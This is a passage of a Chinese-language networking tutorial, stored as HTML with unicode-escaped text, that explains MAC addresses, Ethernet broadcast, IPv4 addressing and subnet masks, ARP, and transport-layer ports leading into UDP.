<p>\u524d6\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u662f\u5382\u5546\u7f16\u53f7\uff0c\u540e6\u4e2a\u662f\u8be5\u5382\u5546\u7684\u7f51\u5361\u6d41\u6c34\u53f7\u3002\u6709\u4e86MAC\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u5b9a\u4f4d\u7f51\u5361\u548c\u6570\u636e\u5305\u7684\u8def\u5f84\u4e86\u3002</p> <p>3.4 \u5e7f\u64ad</p> <p>\u5b9a\u4e49\u5730\u5740\u53ea\u662f\u7b2c\u4e00\u6b65\uff0c\u540e\u9762\u8fd8\u6709\u66f4\u591a\u7684\u6b65\u9aa4\u3002</p> <p>\u9996\u5148\uff0c\u4e00\u5757\u7f51\u5361\u600e\u4e48\u4f1a\u77e5\u9053\u53e6\u4e00\u5757\u7f51\u5361\u7684MAC\u5730\u5740\uff1f</p> <p>\u56de\u7b54\u662f\u6709\u4e00\u79cdARP\u534f\u8bae\uff0c\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u8fd9\u4e2a\u7559\u5230\u540e\u9762\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u77e5\u9053\uff0c\u4ee5\u592a\u7f51\u6570\u636e\u5305\u5fc5\u987b\u77e5\u9053\u63a5\u6536\u65b9\u7684MAC\u5730\u5740\uff0c\u7136\u540e\u624d\u80fd\u53d1\u9001\u3002</p> <p>\u5176\u6b21\uff0c\u5c31\u7b97\u6709\u4e86MAC\u5730\u5740\uff0c\u7cfb\u7edf\u600e\u6837\u624d\u80fd\u628a\u6570\u636e\u5305\u51c6\u786e\u9001\u5230\u63a5\u6536\u65b9\uff1f</p> <p>\u56de\u7b54\u662f\u4ee5\u592a\u7f51\u91c7\u7528\u4e86\u4e00\u79cd\u5f88\"\u539f\u59cb\"\u7684\u65b9\u5f0f\uff0c\u5b83\u4e0d\u662f\u628a\u6570\u636e\u5305\u51c6\u786e\u9001\u5230\u63a5\u6536\u65b9\uff0c\u800c\u662f\u5411\u672c\u7f51\u7edc\u5185\u6240\u6709\u8ba1\u7b97\u673a\u53d1\u9001\uff0c\u8ba9\u6bcf\u53f0\u8ba1\u7b97\u673a\u81ea\u5df1\u5224\u65ad\uff0c\u662f\u5426\u4e3a\u63a5\u6536\u65b9\u3002</p> <p></p> <p>\u4e0a\u56fe\u4e2d\uff0c1\u53f7\u8ba1\u7b97\u673a\u54112\u53f7\u8ba1\u7b97\u673a\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5305\uff0c\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u76843\u53f7\u30014\u53f7\u30015\u53f7\u8ba1\u7b97\u673a\u90fd\u4f1a\u6536\u5230\u8fd9\u4e2a\u5305\u3002\u5b83\u4eec\u8bfb\u53d6\u8fd9\u4e2a\u5305\u7684\"\u6807\u5934\"\uff0c\u627e\u5230\u63a5\u6536\u65b9\u7684MAC\u5730\u5740\uff0c\u7136\u540e\u4e0e\u81ea\u8eab\u7684MAC\u5730\u5740\u76f8\u6bd4\u8f83\uff0c\u5982\u679c\u4e24\u8005\u76f8\u540c\uff0c\u5c31\u63a5\u53d7\u8fd9\u4e2a\u5305\uff0c\u505a\u8fdb\u4e00\u6b65\u5904\u7406\uff0c\u5426\u5219\u5c31\u4e22\u5f03\u8fd9\u4e2a\u5305\u3002\u8fd9\u79cd\u53d1\u9001\u65b9\u5f0f\u5c31\u53eb\u505a\"\u5e7f\u64ad\"\uff08broadcasting\uff09\u3002</p> <p>\u6709\u4e86\u6570\u636e\u5305\u7684\u5b9a\u4e49\u3001\u7f51\u5361\u7684MAC\u5730\u5740\u3001\u5e7f\u64ad\u7684\u53d1\u9001\u65b9\u5f0f\uff0c\"\u94fe\u63a5\u5c42\"\u5c31\u53ef\u4ee5\u5728\u591a\u53f0\u8ba1\u7b97\u673a\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u4e86\u3002</p> <p>\u56db\u3001\u7f51\u7edc\u5c42</p> <p>4.1 \u7f51\u7edc\u5c42\u7684\u7531\u6765</p> <p>\u4ee5\u592a\u7f51\u534f\u8bae\uff0c\u4f9d\u9760MAC\u5730\u5740\u53d1\u9001\u6570\u636e\u3002\u7406\u8bba\u4e0a\uff0c\u5355\u5355\u4f9d\u9760MAC\u5730\u5740\uff0c\u4e0a\u6d77\u7684\u7f51\u5361\u5c31\u53ef\u4ee5\u627e\u5230\u6d1b\u6749\u77f6\u7684\u7f51\u5361\u4e86\uff0c\u6280\u672f\u4e0a\u662f\u53ef\u4ee5\u5b9e\u73b0\u7684\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u6837\u505a\u6709\u4e00\u4e2a\u91cd\u5927\u7684\u7f3a\u70b9\u3002\u4ee5\u592a\u7f51\u91c7\u7528\u5e7f\u64ad\u65b9\u5f0f\u53d1\u9001\u6570\u636e\u5305\uff0c\u6240\u6709\u6210\u5458\u4eba\u624b\u4e00\"\u5305\"\uff0c\u4e0d\u4ec5\u6548\u7387\u4f4e\uff0c\u800c\u4e14\u5c40\u9650\u5728\u53d1\u9001\u8005\u6240\u5728\u7684\u5b50\u7f51\u7edc\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u4e24\u53f0\u8ba1\u7b97\u673a\u4e0d\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u5e7f\u64ad\u662f\u4f20\u4e0d\u8fc7\u53bb\u7684\u3002\u8fd9\u79cd\u8bbe\u8ba1\u662f\u5408\u7406\u7684\uff0c\u5426\u5219\u4e92\u8054\u7f51\u4e0a\u6bcf\u4e00\u53f0\u8ba1\u7b97\u673a\u90fd\u4f1a\u6536\u5230\u6240\u6709\u5305\uff0c\u90a3\u4f1a\u5f15\u8d77\u707e\u96be\u3002</p> <p>\u4e92\u8054\u7f51\u662f\u65e0\u6570\u5b50\u7f51\u7edc\u5171\u540c\u7ec4\u6210\u7684\u4e00\u4e2a\u5de8\u578b\u7f51\u7edc\uff0c\u5f88\u50cf\u60f3\u8c61\u4e0a\u6d77\u548c\u6d1b\u6749\u77f6\u7684\u7535\u8111\u4f1a\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u8fd9\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u5fc5\u987b\u627e\u5230\u4e00\u79cd\u65b9\u6cd5\uff0c\u80fd\u591f\u533a\u5206\u54ea\u4e9bMAC\u5730\u5740\u5c5e\u4e8e\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u54ea\u4e9b\u4e0d\u662f\u3002\u5982\u679c\u662f\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u5c31\u91c7\u7528\u5e7f\u64ad\u65b9\u5f0f\u53d1\u9001\uff0c\u5426\u5219\u5c31\u91c7\u7528\"\u8def\u7531\"\u65b9\u5f0f\u53d1\u9001\u3002\uff08\"\u8def\u7531\"\u7684\u610f\u601d\uff0c\u5c31\u662f\u6307\u5982\u4f55\u5411\u4e0d\u540c\u7684\u5b50\u7f51\u7edc\u5206\u53d1\u6570\u636e\u5305\uff0c\u8fd9\u662f\u4e00\u4e2a\u5f88\u5927\u7684\u4e3b\u9898\uff0c\u672c\u6587\u4e0d\u6d89\u53ca\u3002\uff09\u9057\u61be\u7684\u662f\uff0cMAC\u5730\u5740\u672c\u8eab\u65e0\u6cd5\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u5b83\u53ea\u4e0e\u5382\u5546\u6709\u5173\uff0c\u4e0e\u6240\u5904\u7f51\u7edc\u65e0\u5173\u3002</p> <p>\u8fd9\u5c31\u5bfc\u81f4\u4e86\"\u7f51\u7edc\u5c42\"\u7684\u8bde\u751f\u3002\u5b83\u7684\u4f5c\u7528\u662f\u5f15\u8fdb\u4e00\u5957\u65b0\u7684\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u80fd\u591f\u533a\u5206\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u3002\u8fd9\u5957\u5730\u5740\u5c31\u53eb\u505a\"\u7f51\u7edc\u5730\u5740\"\uff0c\u7b80\u79f0\"\u7f51\u5740\"\u3002</p> <p>\u4e8e\u662f\uff0c\"\u7f51\u7edc\u5c42\"\u51fa\u73b0\u4ee5\u540e\uff0c\u6bcf\u53f0\u8ba1\u7b97\u673a\u6709\u4e86\u4e24\u79cd\u5730\u5740\uff0c\u4e00\u79cd\u662fMAC\u5730\u5740\uff0c\u53e6\u4e00\u79cd\u662f\u7f51\u7edc\u5730\u5740\u3002\u4e24\u79cd\u5730\u5740\u4e4b\u95f4\u6ca1\u6709\u4efb\u4f55\u8054\u7cfb\uff0cMAC\u5730\u5740\u662f\u7ed1\u5b9a\u5728\u7f51\u5361\u4e0a\u7684\uff0c\u7f51\u7edc\u5730\u5740\u5219\u662f\u7ba1\u7406\u5458\u5206\u914d\u7684\uff0c\u5b83\u4eec\u53ea\u662f\u968f\u673a\u7ec4\u5408\u5728\u4e00\u8d77\u3002</p> <p>\u7f51\u7edc\u5730\u5740\u5e2e\u52a9\u6211\u4eec\u786e\u5b9a\u8ba1\u7b97\u673a\u6240\u5728\u7684\u5b50\u7f51\u7edc\uff0cMAC\u5730\u5740\u5219\u5c06\u6570\u636e\u5305\u9001\u5230\u8be5\u5b50\u7f51\u7edc\u4e2d\u7684\u76ee\u6807\u7f51\u5361\u3002\u56e0\u6b64\uff0c\u4ece\u903b\u8f91\u4e0a\u53ef\u4ee5\u63a8\u65ad\uff0c\u5fc5\u5b9a\u662f\u5148\u5904\u7406\u7f51\u7edc\u5730\u5740\uff0c\u7136\u540e\u518d\u5904\u7406MAC\u5730\u5740\u3002</p> <p>4.2 IP\u534f\u8bae</p> <p>\u89c4\u5b9a\u7f51\u7edc\u5730\u5740\u7684\u534f\u8bae\uff0c\u53eb\u505aIP\u534f\u8bae\u3002\u5b83\u6240\u5b9a\u4e49\u7684\u5730\u5740\uff0c\u5c31\u88ab\u79f0\u4e3aIP\u5730\u5740\u3002</p> <p>\u76ee\u524d\uff0c\u5e7f\u6cdb\u91c7\u7528\u7684\u662fIP\u534f\u8bae\u7b2c\u56db\u7248\uff0c\u7b80\u79f0IPv4\u3002\u8fd9\u4e2a\u7248\u672c\u89c4\u5b9a\uff0c\u7f51\u7edc\u5730\u5740\u753132\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u7ec4\u6210\u3002</p> <p></p> <p>\u4e60\u60ef\u4e0a\uff0c\u6211\u4eec\u7528\u5206\u6210\u56db\u6bb5\u7684\u5341\u8fdb\u5236\u6570\u8868\u793aIP\u5730\u5740\uff0c\u4ece0.0.0.0\u4e00\u76f4\u5230255.255.255.255\u3002</p> <p>\u4e92\u8054\u7f51\u4e0a\u7684\u6bcf\u4e00\u53f0\u8ba1\u7b97\u673a\uff0c\u90fd\u4f1a\u5206\u914d\u5230\u4e00\u4e2aIP\u5730\u5740\u3002\u8fd9\u4e2a\u5730\u5740\u5206\u6210\u4e24\u4e2a\u90e8\u5206\uff0c\u524d\u4e00\u90e8\u5206\u4ee3\u8868\u7f51\u7edc\uff0c\u540e\u4e00\u90e8\u5206\u4ee3\u8868\u4e3b\u673a\u3002\u6bd4\u5982\uff0cIP\u5730\u5740172.16.254.1\uff0c\u8fd9\u662f\u4e00\u4e2a32\u4f4d\u7684\u5730\u5740\uff0c\u5047\u5b9a\u5b83\u7684\u7f51\u7edc\u90e8\u5206\u662f\u524d24\u4f4d\uff08172.16.254\uff09\uff0c\u90a3\u4e48\u4e3b\u673a\u90e8\u5206\u5c31\u662f\u540e8\u4f4d\uff08\u6700\u540e\u7684\u90a3\u4e2a1\uff09\u3002\u5904\u4e8e\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u7684\u7535\u8111\uff0c\u5b83\u4eecIP\u5730\u5740\u7684\u7f51\u7edc\u90e8\u5206\u5fc5\u5b9a\u662f\u76f8\u540c\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4172.16.254.2\u5e94\u8be5\u4e0e172.16.254.1\u5904\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u3002</p> <p>\u4f46\u662f\uff0c\u95ee\u9898\u5728\u4e8e\u5355\u5355\u4eceIP\u5730\u5740\uff0c\u6211\u4eec\u65e0\u6cd5\u5224\u65ad\u7f51\u7edc\u90e8\u5206\u3002\u8fd8\u662f\u4ee5172.16.254.1\u4e3a\u4f8b\uff0c\u5b83\u7684\u7f51\u7edc\u90e8\u5206\uff0c\u5230\u5e95\u662f\u524d24\u4f4d\uff0c\u8fd8\u662f\u524d16\u4f4d\uff0c\u751a\u81f3\u524d28\u4f4d\uff0c\u4eceIP\u5730\u5740\u4e0a\u662f\u770b\u4e0d\u51fa\u6765\u7684\u3002</p> <p>\u90a3\u4e48\uff0c\u600e\u6837\u624d\u80fd\u4eceIP\u5730\u5740\uff0c\u5224\u65ad\u4e24\u53f0\u8ba1\u7b97\u673a\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u5462\uff1f\u8fd9\u5c31\u8981\u7528\u5230\u53e6\u4e00\u4e2a\u53c2\u6570\"\u5b50\u7f51\u63a9\u7801\"\uff08subnet mask\uff09\u3002</p> <p>\u6240\u8c13\"\u5b50\u7f51\u63a9\u7801\"\uff0c\u5c31\u662f\u8868\u793a\u5b50\u7f51\u7edc\u7279\u5f81\u7684\u4e00\u4e2a\u53c2\u6570\u3002\u5b83\u5728\u5f62\u5f0f\u4e0a\u7b49\u540c\u4e8eIP\u5730\u5740\uff0c\u4e5f\u662f\u4e00\u4e2a32\u4f4d\u4e8c\u8fdb\u5236\u6570\u5b57\uff0c\u5b83\u7684\u7f51\u7edc\u90e8\u5206\u5168\u90e8\u4e3a1\uff0c\u4e3b\u673a\u90e8\u5206\u5168\u90e8\u4e3a0\u3002\u6bd4\u5982\uff0cIP\u5730\u5740172.16.254.1\uff0c\u5982\u679c\u5df2\u77e5\u7f51\u7edc\u90e8\u5206\u662f\u524d24\u4f4d\uff0c\u4e3b\u673a\u90e8\u5206\u662f\u540e8\u4f4d\uff0c\u90a3\u4e48\u5b50\u7f51\u7edc\u63a9\u7801\u5c31\u662f11111111.11111111.11111111.00000000\uff0c\u5199\u6210\u5341\u8fdb\u5236\u5c31\u662f255.255.255.0\u3002</p> <p>\u77e5\u9053\"\u5b50\u7f51\u63a9\u7801\"\uff0c\u6211\u4eec\u5c31\u80fd\u5224\u65ad\uff0c\u4efb\u610f\u4e24\u4e2aIP\u5730\u5740\u662f\u5426\u5904\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u3002\u65b9\u6cd5\u662f\u5c06\u4e24\u4e2aIP\u5730\u5740\u4e0e\u5b50\u7f51\u63a9\u7801\u5206\u522b\u8fdb\u884cAND\u8fd0\u7b97\uff08\u4e24\u4e2a\u6570\u4f4d\u90fd\u4e3a1\uff0c\u8fd0\u7b97\u7ed3\u679c\u4e3a1\uff0c\u5426\u5219\u4e3a0\uff09\uff0c\u7136\u540e\u6bd4\u8f83\u7ed3\u679c\u662f\u5426\u76f8\u540c\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u8868\u660e\u5b83\u4eec\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u4e2d\uff0c\u5426\u5219\u5c31\u4e0d\u662f\u3002</p> <p>\u6bd4\u5982\uff0c\u5df2\u77e5IP\u5730\u5740172.16.254.1\u548c172.16.254.233\u7684\u5b50\u7f51\u63a9\u7801\u90fd\u662f255.255.255.0\uff0c\u8bf7\u95ee\u5b83\u4eec\u662f\u5426\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff1f\u4e24\u8005\u4e0e\u5b50\u7f51\u63a9\u7801\u5206\u522b\u8fdb\u884cAND\u8fd0\u7b97\uff0c\u7ed3\u679c\u90fd\u662f172.16.254.0\uff0c\u56e0\u6b64\u5b83\u4eec\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u3002</p> <p>\u603b\u7ed3\u4e00\u4e0b\uff0cIP\u534f\u8bae\u7684\u4f5c\u7528\u4e3b\u8981\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u4e3a\u6bcf\u4e00\u53f0\u8ba1\u7b97\u673a\u5206\u914dIP\u5730\u5740\uff0c\u53e6\u4e00\u4e2a\u662f\u786e\u5b9a\u54ea\u4e9b\u5730\u5740\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u3002</p> <p>4.3 IP\u6570\u636e\u5305</p> <p>\u6839\u636eIP\u534f\u8bae\u53d1\u9001\u7684\u6570\u636e\uff0c\u5c31\u53eb\u505aIP\u6570\u636e\u5305\u3002\u4e0d\u96be\u60f3\u8c61\uff0c\u5176\u4e2d\u5fc5\u5b9a\u5305\u62ecIP\u5730\u5740\u4fe1\u606f\u3002</p> <p>\u4f46\u662f\u524d\u9762\u8bf4\u8fc7\uff0c\u4ee5\u592a\u7f51\u6570\u636e\u5305\u53ea\u5305\u542bMAC\u5730\u5740\uff0c\u5e76\u6ca1\u6709IP\u5730\u5740\u7684\u680f\u4f4d\u3002\u90a3\u4e48\u662f\u5426\u9700\u8981\u4fee\u6539\u6570\u636e\u5b9a\u4e49\uff0c\u518d\u6dfb\u52a0\u4e00\u4e2a\u680f\u4f4d\u5462\uff1f</p> <p>\u56de\u7b54\u662f\u4e0d\u9700\u8981\uff0c\u6211\u4eec\u53ef\u4ee5\u628aIP\u6570\u636e\u5305\u76f4\u63a5\u653e\u8fdb\u4ee5\u592a\u7f51\u6570\u636e\u5305\u7684\"\u6570\u636e\"\u90e8\u5206\uff0c\u56e0\u6b64\u5b8c\u5168\u4e0d\u7528\u4fee\u6539\u4ee5\u592a\u7f51\u7684\u89c4\u683c\u3002\u8fd9\u5c31\u662f\u4e92\u8054\u7f51\u5206\u5c42\u7ed3\u6784\u7684\u597d\u5904\uff1a\u4e0a\u5c42\u7684\u53d8\u52a8\u5b8c\u5168\u4e0d\u6d89\u53ca\u4e0b\u5c42\u7684\u7ed3\u6784\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\uff0cIP\u6570\u636e\u5305\u4e5f\u5206\u4e3a\"\u6807\u5934\"\u548c\"\u6570\u636e\"\u4e24\u4e2a\u90e8\u5206\u3002</p> <p></p> <p>\"\u6807\u5934\"\u90e8\u5206\u4e3b\u8981\u5305\u62ec\u7248\u672c\u3001\u957f\u5ea6\u3001IP\u5730\u5740\u7b49\u4fe1\u606f\uff0c\"\u6570\u636e\"\u90e8\u5206\u5219\u662fIP\u6570\u636e\u5305\u7684\u5177\u4f53\u5185\u5bb9\u3002\u5b83\u653e\u8fdb\u4ee5\u592a\u7f51\u6570\u636e\u5305\u540e\uff0c\u4ee5\u592a\u7f51\u6570\u636e\u5305\u5c31\u53d8\u6210\u4e86\u4e0b\u9762\u8fd9\u6837\u3002</p> <p></p> <p>IP\u6570\u636e\u5305\u7684\"\u6807\u5934\"\u90e8\u5206\u7684\u957f\u5ea6\u4e3a20\u523060\u5b57\u8282\uff0c\u6574\u4e2a\u6570\u636e\u5305\u7684\u603b\u957f\u5ea6\u6700\u5927\u4e3a65,535\u5b57\u8282\u3002\u56e0\u6b64\uff0c\u7406\u8bba\u4e0a\uff0c\u4e00\u4e2aIP\u6570\u636e\u5305\u7684\"\u6570\u636e\"\u90e8\u5206\uff0c\u6700\u957f\u4e3a65,515\u5b57\u8282\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u4ee5\u592a\u7f51\u6570\u636e\u5305\u7684\"\u6570\u636e\"\u90e8\u5206\uff0c\u6700\u957f\u53ea\u67091500\u5b57\u8282\u3002\u56e0\u6b64\uff0c\u5982\u679cIP\u6570\u636e\u5305\u8d85\u8fc7\u4e861500\u5b57\u8282\uff0c\u5b83\u5c31\u9700\u8981\u5206\u5272\u6210\u51e0\u4e2a\u4ee5\u592a\u7f51\u6570\u636e\u5305\uff0c\u5206\u5f00\u53d1\u9001\u4e86\u3002</p> <p>4.4 ARP\u534f\u8bae</p> <p>\u5173\u4e8e\"\u7f51\u7edc\u5c42\"\uff0c\u8fd8\u6709\u6700\u540e\u4e00\u70b9\u9700\u8981\u8bf4\u660e\u3002</p> <p>\u56e0\u4e3aIP\u6570\u636e\u5305\u662f\u653e\u5728\u4ee5\u592a\u7f51\u6570\u636e\u5305\u91cc\u53d1\u9001\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u540c\u65f6\u77e5\u9053\u4e24\u4e2a\u5730\u5740\uff0c\u4e00\u4e2a\u662f\u5bf9\u65b9\u7684MAC\u5730\u5740\uff0c\u53e6\u4e00\u4e2a\u662f\u5bf9\u65b9\u7684IP\u5730\u5740\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u65b9\u7684IP\u5730\u5740\u662f\u5df2\u77e5\u7684\uff08\u540e\u6587\u4f1a\u89e3\u91ca\uff09\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u5b83\u7684MAC\u5730\u5740\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981\u4e00\u79cd\u673a\u5236\uff0c\u80fd\u591f\u4eceIP\u5730\u5740\u5f97\u5230MAC\u5730\u5740\u3002</p> <p>\u8fd9\u91cc\u53c8\u53ef\u4ee5\u5206\u6210\u4e24\u79cd\u60c5\u51b5\u3002\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u4e24\u53f0\u4e3b\u673a\u4e0d\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u90a3\u4e48\u4e8b\u5b9e\u4e0a\u6ca1\u6709\u529e\u6cd5\u5f97\u5230\u5bf9\u65b9\u7684MAC\u5730\u5740\uff0c\u53ea\u80fd\u628a\u6570\u636e\u5305\u4f20\u9001\u5230\u4e24\u4e2a\u5b50\u7f51\u7edc\u8fde\u63a5\u5904\u7684\"\u7f51\u5173\"\uff08gateway\uff09\uff0c\u8ba9\u7f51\u5173\u53bb\u5904\u7406\u3002</p> <p>\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u5982\u679c\u4e24\u53f0\u4e3b\u673a\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u7528ARP\u534f\u8bae\uff0c\u5f97\u5230\u5bf9\u65b9\u7684MAC\u5730\u5740\u3002ARP\u534f\u8bae\u4e5f\u662f\u53d1\u51fa\u4e00\u4e2a\u6570\u636e\u5305\uff08\u5305\u542b\u5728\u4ee5\u592a\u7f51\u6570\u636e\u5305\u4e2d\uff09\uff0c\u5176\u4e2d\u5305\u542b\u5b83\u6240\u8981\u67e5\u8be2\u4e3b\u673a\u7684IP\u5730\u5740\uff0c\u5728\u5bf9\u65b9\u7684MAC\u5730\u5740\u8fd9\u4e00\u680f\uff0c\u586b\u7684\u662fFF:FF:FF:FF:FF:FF\uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\"\u5e7f\u64ad\"\u5730\u5740\u3002\u5b83\u6240\u5728\u5b50\u7f51\u7edc\u7684\u6bcf\u4e00\u53f0\u4e3b\u673a\uff0c\u90fd\u4f1a\u6536\u5230\u8fd9\u4e2a\u6570\u636e\u5305\uff0c\u4ece\u4e2d\u53d6\u51faIP\u5730\u5740\uff0c\u4e0e\u81ea\u8eab\u7684IP\u5730\u5740\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e24\u8005\u76f8\u540c\uff0c\u90fd\u505a\u51fa\u56de\u590d\uff0c\u5411\u5bf9\u65b9\u62a5\u544a\u81ea\u5df1\u7684MAC\u5730\u5740\uff0c\u5426\u5219\u5c31\u4e22\u5f03\u8fd9\u4e2a\u5305\u3002</p> <p>\u603b\u4e4b\uff0c\u6709\u4e86ARP\u534f\u8bae\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u540c\u4e00\u4e2a\u5b50\u7f51\u7edc\u5185\u7684\u4e3b\u673aMAC\u5730\u5740\uff0c\u53ef\u4ee5\u628a\u6570\u636e\u5305\u53d1\u9001\u5230\u4efb\u610f\u4e00\u53f0\u4e3b\u673a\u4e4b\u4e0a\u4e86\u3002</p> <p>\u4e94\u3001\u4f20\u8f93\u5c42</p> <p>5.1 \u4f20\u8f93\u5c42\u7684\u7531\u6765</p> <p>\u6709\u4e86MAC\u5730\u5740\u548cIP\u5730\u5740\uff0c\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u5728\u4e92\u8054\u7f51\u4e0a\u4efb\u610f\u4e24\u53f0\u4e3b\u673a\u4e0a\u5efa\u7acb\u901a\u4fe1\u3002</p> <p>\u63a5\u4e0b\u6765\u7684\u95ee\u9898\u662f\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\u6709\u8bb8\u591a\u7a0b\u5e8f\u90fd\u9700\u8981\u7528\u5230\u7f51\u7edc\uff0c\u6bd4\u5982\uff0c\u4f60\u4e00\u8fb9\u6d4f\u89c8\u7f51\u9875\uff0c\u4e00\u8fb9\u4e0e\u670b\u53cb\u5728\u7ebf\u804a\u5929\u3002\u5f53\u4e00\u4e2a\u6570\u636e\u5305\u4ece\u4e92\u8054\u7f51\u4e0a\u53d1\u6765\u7684\u65f6\u5019\uff0c\u4f60\u600e\u4e48\u77e5\u9053\uff0c\u5b83\u662f\u8868\u793a\u7f51\u9875\u7684\u5185\u5bb9\uff0c\u8fd8\u662f\u8868\u793a\u5728\u7ebf\u804a\u5929\u7684\u5185\u5bb9\uff1f</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u8fd9\u4e2a\u6570\u636e\u5305\u5230\u5e95\u4f9b\u54ea\u4e2a\u7a0b\u5e8f\uff08\u8fdb\u7a0b\uff09\u4f7f\u7528\u3002\u8fd9\u4e2a\u53c2\u6570\u5c31\u53eb\u505a\"\u7aef\u53e3\"\uff08port\uff09\uff0c\u5b83\u5176\u5b9e\u662f\u6bcf\u4e00\u4e2a\u4f7f\u7528\u7f51\u5361\u7684\u7a0b\u5e8f\u7684\u7f16\u53f7\u3002\u6bcf\u4e2a\u6570\u636e\u5305\u90fd\u53d1\u5230\u4e3b\u673a\u7684\u7279\u5b9a\u7aef\u53e3\uff0c\u6240\u4ee5\u4e0d\u540c\u7684\u7a0b\u5e8f\u5c31\u80fd\u53d6\u5230\u81ea\u5df1\u6240\u9700\u8981\u7684\u6570\u636e\u3002</p> <p>\"\u7aef\u53e3\"\u662f0\u523065535\u4e4b\u95f4\u7684\u4e00\u4e2a\u6574\u6570\uff0c\u6b63\u597d16\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u30020\u52301023\u7684\u7aef\u53e3\u88ab\u7cfb\u7edf\u5360\u7528\uff0c\u7528\u6237\u53ea\u80fd\u9009\u7528\u5927\u4e8e1023\u7684\u7aef\u53e3\u3002\u4e0d\u7ba1\u662f\u6d4f\u89c8\u7f51\u9875\u8fd8\u662f\u5728\u7ebf\u804a\u5929\uff0c\u5e94\u7528\u7a0b\u5e8f\u4f1a\u968f\u673a\u9009\u7528\u4e00\u4e2a\u7aef\u53e3\uff0c\u7136\u540e\u4e0e\u670d\u52a1\u5668\u7684\u76f8\u5e94\u7aef\u53e3\u8054\u7cfb\u3002</p> <p>**\"\u4f20\u8f93\u5c42\"\u7684\u529f\u80fd\uff0c\u5c31\u662f\u5efa\u7acb\"\u7aef\u53e3\u5230\u7aef\u53e3\"\u7684\u901a\u4fe1\u3002\u76f8\u6bd4\u4e4b\u4e0b\uff0c\"\u7f51\u7edc\u5c42\"\u7684\u529f\u80fd\u662f\u5efa\u7acb\"\u4e3b\u673a\u5230\u4e3b\u673a\"\u7684\u901a\u4fe1\u3002\u53ea\u8981\u786e\u5b9a\u4e3b\u673a\u548c\u7aef\u53e3\uff0c\u6211\u4eec\u5c31\u80fd\u5b9e\u73b0\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4ea4\u6d41\u3002**\u56e0\u6b64\uff0cUnix\u7cfb\u7edf\u5c31\u628a\u4e3b\u673a+\u7aef\u53e3\uff0c\u53eb\u505a\"\u5957\u63a5\u5b57\"\uff08socket\uff09\u3002\u6709\u4e86\u5b83\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4e86\u3002</p> <p>5.2 UDP\u534f\u8bae</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u5fc5\u987b\u5728\u6570\u636e\u5305\u4e2d\u52a0\u5165\u7aef\u53e3\u4fe1\u606f\uff0c\u8fd9\u5c31\u9700\u8981\u65b0\u7684\u534f\u8bae\u3002\u6700\u7b80\u5355\u7684\u5b9e\u73b0\u53eb\u505aUDP\u534f\u8bae\uff0c\u5b83\u7684\u683c\u5f0f\u51e0\u4e4e\u5c31\u662f\u5728\u6570\u636e\u524d\u9762\uff0c\u52a0\u4e0a\u7aef\u53e3\u53f7\u3002</p> <p>UDP\u6570\u636e\u5305\uff0c\u4e5f\u662f\u7531\"\u6807\u5934\"\u548c\"\u6570\u636e\"\u4e24\u90e8\u5206\u7ec4\u6210\u3002</p> <p></p> 